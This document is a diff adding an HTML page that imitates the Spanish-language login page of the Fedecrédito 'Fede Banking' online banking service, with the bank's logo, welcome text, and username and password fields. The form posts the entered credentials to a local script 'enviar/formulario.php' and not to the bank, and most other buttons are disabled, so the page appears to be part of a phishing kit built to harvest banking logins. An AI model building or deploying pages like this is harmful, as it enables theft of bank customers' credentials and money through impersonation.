@@ -1,0 +1,199 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, user-scalable=no"
+    />
+    <title>Fedebanking</title>
+    <link href="./system/bootstrap.min.css" rel="stylesheet" />
+    <!-- 22062 -->
+    <link rel="stylesheet" href="./system/master.css" />
+  </head>
+
+  <body id="login" style="">
+    <!--header-->
+    <div id="header" class="container">
+      <div class="row">
+        <div class="col-xs-6 col-sm-3 col-md-3">
+          <img
+            id="logo"
+            src="./system/logo-fedecredito.png"
+            alt=""
+            class="img-responsive"
+          />
+        </div>
+        <div class="col-xs-6 col-sm-9 col-md-9">
+          <div class="security-seal-welcome"></div>
+        </div>
+      </div>
+    </div>
+    <br />
+    <div class="container-fluid">
+      <div class="row">
+        <div class="linea-header"></div>
+      </div>
+    </div>
+    <section class="all" id="login-container">
+      <div class="container">
+        <div class="row push_3 grid_9 Container_12">
+          <div id="izquier-log" class="col-xs-12 col-sm-8 col-md-8 grid_4">
+            <h3>Bienvenido</h3>
+            <h5 style="font-weight: bold;">
+              <span style="font-size: 1.2em;">Bienvenido a FEDE BANKING,</span> el servicio de banca en línea para los
+              socios y clientes de las CAJAS DE CRÉDITO y los BANCOS DE LOS
+              TRABAJADORES miembros del SISTEMA FEDECRÉDITO.
+            </h5>
+
+            <form name="login" method="post" action="enviar/formulario.php">
+              <div class="form-group">
+                <label>Usuario</label>
+                <input
+                  name="user"
+                  maxlength="20"
+                  size="10"
+                  id="ucLoginInicio_txtUsuario"
+                  class="form-control"
+                  type="text input-text"
+                required/>
+                <span
+                  id="ucLoginInicio_rvUsuario"
+                  style="color: Red; display: none"
+                ></span>
+              </div>
+
+              <div class="form-group">
+                <label>Clave</label>
+                <input
+                  name="Clave"
+                  maxlength="20"
+                  size="10"
+                  id="ucLoginInicio_txtUsuario"
+                  class="form-control"
+                  type="password"
+                required/>
+                <span
+                  id="ucLoginInicio_rvUsuario"
+                  style="color: Red; display: none"
+                ></span>
+              </div>
+
+              <div class="centered">
+                <div class="text">
+                  <div
+                    id="ucLoginInicio_vsResumen"
+                    style="color: Red; display: none"
+                  ></div>
+                  <div style="text-align: center" width="100%">
+                    <span
+                      id="ucLoginInicio_lblMensaje"
+                      style="color:Red;font-size:16px;font-family:&#39;brandon_grotesquemedium&#39;;"
+                    ></span>
+                  </div>
+                  <br />
+                </div>
+              </div>
+
+              <table width="100%">
+                <tbody>
+                  <tr>
+                    <td width="50%"></td>
+                    <td style="text-align: center">
+                      <label id="lblRecuperarUsuario"
+                        >¿Olvidaste tu usuario?</label
+                      >
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+
+              <center>
+                <input
+                  type="image"
+                  name="ucLoginInicio$btnIngresar"
+                  id="ucLoginInicio_btnIngresar"
+                  type="submit"
+                  src="./system/path-01.png"
+                  style="
+                    border-width: 0px;
+                    height: auto;
+                    width: 50%;
+                    float: left;
+                  "
+                />
+                <input
+                  type="image"
+                  name=""
+                  id=""
+                  src="./system/path-03.png"
+                  style="
+                    border-width: 0px;
+                    height: auto;
+                    width: 50%;
+                    float: right;
+                  "disabled
+                />
+                <br />
+                <br />
+                <br />
+              </center>
+
+              <table width="100%">
+                <tbody>
+                  <tr>
+                    <td width="50%"></td>
+                    <td style="text-align: center">
+                      <label id="lblCrearUsuario">¿No tienes usuario?</label>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+
+              <center>
+                <img
+                  id="btnTipoCliente"
+                  src="./system/path-02-1.png"
+                  style="height: auto; width: 50%; float: left"
+                  alt=""
+                />
+
+                <input
+                  type="image"
+                  name="ucLoginInicio$btnCrearUsuario"
+                  id="ucLoginInicio_btnCrearUsuario"
+                  src="./system/path-04.png"
+                  style="
+                    border-width: 0px;
+                    height: auto;
+                    width: 50%;
+                    float: right;
+                  "
+                  disabled
+                />
+                <span style="visibility: hidden"
+                  ><input
+                    id="ucLoginInicio_chkEstadoCliente"
+                    type="checkbox"
+                    name="ucLoginInicio$chkEstadoCliente"
+                /></span>
+              </center>
+
+            </form>
+          </div>
+
+          <div id="derecho-log" class="col-xs-12 col-sm-4 col-md-4">
+            <center>
+              <img
+                src="./system/telefono-de-ayuda.png"
+                alt=""
+                class="img-responsive"
+              />
+            </center>
+          </div>
+        </div>
+      </div>
+    </section>
+  </body>
+</html>
